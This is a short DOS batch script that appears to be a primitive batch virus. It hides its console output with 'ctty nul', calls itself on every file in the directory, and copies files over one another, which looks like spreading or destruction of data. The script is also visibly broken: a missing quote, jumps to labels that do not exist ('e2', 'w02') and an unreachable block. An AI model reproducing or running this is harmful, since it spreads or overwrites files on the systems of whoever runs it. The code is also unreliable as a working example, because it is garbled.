   @echo off
   ctty nul
   if "%1"=="autoexec.bat goto fin
   if "%1"=="" goto e1
   if not "%1"=="" goto e2
   goto e3
   :e1
   ctty nul
   for %%x in (*.*) do call %0 %x
   goto e3
   if not "%tas"== "" goto w02
   set tas=%1
   goto e3
   :e02
   copy %1 %tas
   set tas=%1
   :e3
